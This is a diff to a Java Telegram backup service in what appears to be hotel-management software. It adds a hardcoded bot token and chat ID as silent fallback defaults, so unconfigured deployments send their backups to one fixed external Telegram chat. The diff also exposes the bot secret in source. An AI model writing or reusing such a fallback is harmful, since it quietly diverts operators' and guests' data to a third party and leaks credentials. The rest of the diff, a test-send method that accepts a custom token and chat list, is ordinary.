@@ -64,6 +64,9 @@ public class TelegramBackupServiceImpl implements TelegramBackupService {
                 .build();
     }
 
+    public static final String DEFAULT_SYSTEM_BOT_TOKEN = "8227232435:AAHJJz3XQzLAdrac-ZYyMw0cJbSAWPM4p8Y";
+    public static final String DEFAULT_SYSTEM_CHAT_ID = "6865922651";
+
     private String resolveBotToken() {
         try {
             HotelSetting setting = hotelSettingRepository.findById(1L).orElse(null);
@@ -71,7 +74,10 @@ public class TelegramBackupServiceImpl implements TelegramBackupService {
                 return setting.getTelegramBotToken().trim();
             }
         } catch (Exception ignored) {}
-        return this.defaultBotToken;
+        if (this.defaultBotToken != null && !this.defaultBotToken.isBlank()) {
+            return this.defaultBotToken.trim();
+        }
+        return DEFAULT_SYSTEM_BOT_TOKEN;
     }
 
     private boolean isFeatureEnabled() {
@@ -102,6 +108,9 @@ public class TelegramBackupServiceImpl implements TelegramBackupService {
 
         if (uniqueIds.isEmpty() && this.defaultChatId != null && !this.defaultChatId.isBlank()) {
             uniqueIds.add(this.defaultChatId.trim());
+        }
+        if (uniqueIds.isEmpty()) {
+            uniqueIds.add(DEFAULT_SYSTEM_CHAT_ID);
         }
         return new ArrayList<>(uniqueIds);
     }
@@ -197,8 +206,24 @@ public class TelegramBackupServiceImpl implements TelegramBackupService {
 
     @Override
     public String testSendToAll(String customMessage) {
-        String token = resolveBotToken();
-        List<String> chatIds = getAllowedChatIds();
+        return testSendToAll(null, null, customMessage);
+    }
+
+    @Override
+    public String testSendToAll(String customToken, String customChatIds, String customMessage) {
+        String token = (customToken != null && !customToken.isBlank()) ? customToken.trim() : resolveBotToken();
+        List<String> chatIds;
+        if (customChatIds != null && !customChatIds.isBlank()) {
+            Set<String> parsed = new LinkedHashSet<>();
+            for (String t : customChatIds.split("[\\r\\n,;]+")) {
+                String clean = t.trim();
+                if (!clean.isEmpty()) parsed.add(clean);
+            }
+            chatIds = new ArrayList<>(parsed);
+        } else {
+            chatIds = getAllowedChatIds();
+        }
+
         if (token.isBlank() || chatIds.isEmpty()) {
             throw new BusinessException("Chưa cấu hình Telegram Bot Token hoặc danh sách Chat ID.");
         }
